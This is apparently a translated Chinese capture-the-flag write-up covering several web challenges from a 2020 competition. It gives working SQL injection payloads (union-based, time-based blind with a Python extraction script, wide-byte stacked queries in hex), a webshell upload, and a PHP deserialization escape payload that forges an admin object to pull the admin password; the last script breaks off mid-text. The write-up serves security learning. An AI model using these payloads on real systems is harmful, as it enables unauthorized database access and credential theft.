# 2020新春战疫网络安全公益赛部分Web Writeup
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
最近因为疫情，在家里都没怎么出门，正好i春秋平台举办了`2020新春战疫网络安全公益赛`。学到了一些骚姿势，师傅们都tql了。。。
## DAY1
###  简单的招聘系统
打开页面发现是一个登陆框，直接注册账号登陆进去。发现需要管理员登陆，才能解锁新功能。
在那里xss了半天，没有结果。。。。
最后重新回到登陆页面，使用万能密码登陆，发现能登进去，但是是我刚刚注册的账号，于是重新下发题目，，直接万能密码登陆，发现成功登陆了管理员的账号。
在新功能页面，发现存在注入，可以通过联合注入  
没有任何过滤，就是正常的联合注入，能够注出`flag`  
测试发现回显的字段在2
    1' union select 1,database(),3,4,5#
    nzhaopin
    1' union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()#
    backup,flag,user
    1' union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database()#
    id,safekey,profile,id,flaaag,id,username,password,safekey,profile
    1' union select 1,group_concat(flaaag),3,4,5 from flag#
    flag{9cbb834c-0562-4503-a703-0d2092a220bc}
###  ezupload
比较简单的一道题目  
打开发现存在文件上传，可以直接上传木马文件。。。
然后执行`system('/readflag');`就可以得到`flag`了
看了源码，发现是代码写翻车了(2333333)
###  盲注
打开页面发现源码：
     query($sql);
            }
        }
        highlight_file(__FILE__);
这里我们发现是一个注入，还有`waf`会对输出的参数进行过滤。 最主要的是这里没有任何的回显数据。。。 我们可以考虑的是延时注入。。  
`?id=if(1,sleep(3),1)` 可以造成延时的效果。
测试发现过滤了好多东西：`' % =  * into load_file outfile like union select insert`
发现过滤了一些运算符，我们可以用`REGEXP`来代替。
这里告诉了我们`flag在fl4g里` 也省去了我们很多步骤，能够直接获取`flag`
大致试这个思路 `1 and if(fl4g REGEXP "a",sleep(4),1)%23`，  
脚本：
    import requests
    import time
    url = "http://13922ac12da24dc2863fae519bd12b33160484bcc8a748bd.changame.ichunqiu.com/?id="
    str_1 = '0123456789abcdefgl[]-'
    flag= 'flag{'
    for j in range(100):
        print j
        for i in str_1:
            payload = '1%20and%20if(fl4g%20REGEXP%20"'+flag+i+'",sleep(5),1)%23'
            url_1 = url +payload
            try:
                res = requests.get(url_1,timeout=3)
            except requests.exceptions.ReadTimeout:
                flag += i
                print flag
                break
    flag{efa5f746-1914-4013-94c6-44f8184985dd}
###  babyphp
打开页面，是一个登陆页面，尝试万能密码登陆无果，然后进行目录扫描，发现源码`www.zip`
对源码进行审计：
update.php
    update
    这是一个未完成的页面，上线时建议删除本页面
    ';
    if ($_SESSION['login']!=1){
        echo "你还没有登陆呢！";
    }
    $users=new User();
    $users->update();
    if($_SESSION['login']===1){
        require_once("flag.php");
        echo $flag;
    }
    ?>
只要登陆成功即可获得`flag`, 所以我们要想办法构造`POP链`
我们来看一下`User类`
    class User
    {
        public $id;
        public $age=null;
        public $nickname=null;
       ...
        public function update(){
            $Info=unserialize($this->getNewinfo());
            $age=$Info->age;
            $nickname=$Info->nickname;
            $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);
            //这个功能还没有写完 先占坑
        }
        public function getNewInfo(){
            $age=$_POST['age'];
            $nickname=$_POST['nickname'];
            return safe(serialize(new Info($age,$nickname)));
        }
        public function __destruct(){
            return file_get_contents($this->nickname);//危
        }
        public function __toString()
        {
            $this->nickname->update($this->age);
            return "0-0";
        }
    }
`User类`里的`getNewInfo`有一个过滤，就是替换一些危险的函数  
`User类`存在`__destruct`和`__toString`两个魔术方法。`destruct`直接是文件读取的，而`__toString`是表示当`User`当做字符串打出来的时候就会调用这个函数，`$this->nickname->update($this->age);`  
我们查找一下`update`方法
    class dbCtrl
    {
        public function update($sql)
        {
            //还没来得及写
        }
    }
发现里面没有任何功能，我们就有搜索了一下`__call`魔术方法  
`Info`中存在一个`__call`所以当调用`$Info->update`的时候由于`Info类`中没有`update`这个方法，所以会触发魔术方法`__call`
    class Info{
        public $age;
        public $nickname;
        public $CtrlCase;
        public function __construct($age,$nickname){
            $this->age=$age;
            $this->nickname=$nickname;
        }   
        public function __call($name,$argument){
            echo $this->CtrlCase->login($argument[0]);
        }
    }
这个`__call`魔术方法会调用`echo $this->CtrlCase->login($argument[0]);`
发现`dbCtrl`类有`login`方法
    class dbCtrl
    {
        ...
        public function login($sql)
        {
            $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
            if ($this->mysqli->connect_error) {
                die("连接失败，错误:" . $this->mysqli->connect_error);
            }
            $result=$this->mysqli->prepare($sql);
            $result->bind_param('s', $this->name);
            $result->execute();
            $result->bind_result($idResult, $passwordResult);
            $result->fetch();
            $result->close();
            if ($this->token=='admin') {
                return $idResult;
            }
            if (!$idResult) {
                echo('用户不存在!');
                return false;
            }
            if (md5($this->password)!==$passwordResult) {
                echo('密码错误！');
                return false;
            }
            $_SESSION['token']=$this->name;
            return $idResult;
        }
        public function update($sql)
        {
            //还没来得及写
        }
    }
这里发现这里的`login($sql)`是可以被我们控制的。我们可以进行注入得到管理员的密码。
我们看一下这个`Info类`，
    class Info{
        public $age;
        public $nickname;
        public $CtrlCase;
        public function __construct($age,$nickname){
            $this->age=$age;
            $this->nickname=$nickname;
        }   
        public function __call($name,$argument){
            echo $this->CtrlCase->login($argument[0]);
        }
    }
发现我们能控制的参数只有`age`和`nickname`然而这里还多出来了一个属性`$CtrlCase`，如果我们利用反序列化字符逃逸，是可以控制这个属性的。正好`safe`这个函数给我们反序列化逃逸有了可能。
构造一下：
    token = 'admin';
        }
    } 
    function safe($parm){
        $array= array('union','regexp','load','into','flag','file','insert',"'",'\',"*","alter");
        return str_replace($array,'hacker',$parm);
    }
    Class Info{
        public $CtrlCase;
        public function __construct(){
            $this->CtrlCase = new dbCtrl();
        }
    }
    Class User{
        public $nickname=null;
        public $age=null;
        public function __construct(){
            $this->nickname = new Info();
            $this->age='select password,id from user where username="admin"';
        }
    }
    Class UpdateHelper{
        public $sql;
        public function __construct(){
            $this->sql= new User();
        }
    }
    $a = new UpdateHelper();
    // echo serialize($a);
    $res = '";s:8:"CtrlCase";' . serialize($a) . '}' . "n";
    echo $res;
    //";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":1:{s:5:"token";s:5:"admin";}}s:3:"age";s:51:"select password,id from user where username="admin"";}}}
这个`payload`一个222个字符。一个`*`被过滤成`hacker`后可以挤出5个字符，选择44个`*`和三个`union`，最终组成了`payload`
    age=1&nickname=********************************************unionunion";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":1:{s:5:"token";s:5:"admin";}}s:3:"age";s:51:"select password,id from user where username="admin"";}}}
在线解码就可以得到管理员的密码，登陆就i可以得到`flag`了
    flag{aa934a2e-666f-4669-bf94-1e6c6e6d9397}
## DAY2
###  easysqli_copy
打开题目，发现给出了源码：
     getMessage();
        }
        if(isset($_GET['id']))
        {
            $id = $_GET['id'];
        }
        else
        {
            $test = $db->query("select balabala from table1");
            $res = $test->fetch(PDO::FETCH_ASSOC);
            $id = $res['balabala'];
        }
        if(check($id))
        {
            $query = "select balabala from table1 where 1=?";
            $db->query("set names gbk");
            $row = $db->prepare($query);
            $row->bindParam(1,$id);
            $row->execute();
        }
发现采用了PDO模式，想到了一个大佬的文章
[PDO场景下的SQL注入探究](https://xz.aliyun.com/t/3950)，发现和这个非常相似。
这里过滤了好多东西
    if(preg_match('/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|^|&|database/i',$str,$matches))
发现正常的注入手段都被过滤了。。  
想到可以利用通过转换十六进制来绕过这些限制。  
由于页面没有任何回显的地方，所以可以考虑延时注入。  
`select sleep(1)`的十六进制表示为：`0x73656C65637420736C656570283129`
    $db->query("set names gbk");
看到这里设置的字符集为`gbk`,首先想到的就是宽字节注入。
综上，测试发现：
    id=1%df%27%20;set%20@x=0x73656C65637420736C656570283129;prepare%20a%20from%20@x;execute%20a;
这样能够得到延时的效果
脚本：
    import requests 
    import re
    import time
    import sys
    reload(sys)
    sys.setdefaultencoding("utf8")
    def str_to_hex(s):
        return ''.join([hex(ord(c)).replace('0x', '') for c in s])
    def hex_to_str(s):
        return ''.join([chr(i) for i in [int(b, 16) for b in s.split(' ')]])
    url = "http://c8a6cd9388a04664b7695f43a2489372bae05b16de4e4793.changame.ichunqiu.com//?id=1%df%27%20;set%20@x=0x"
    flag = ""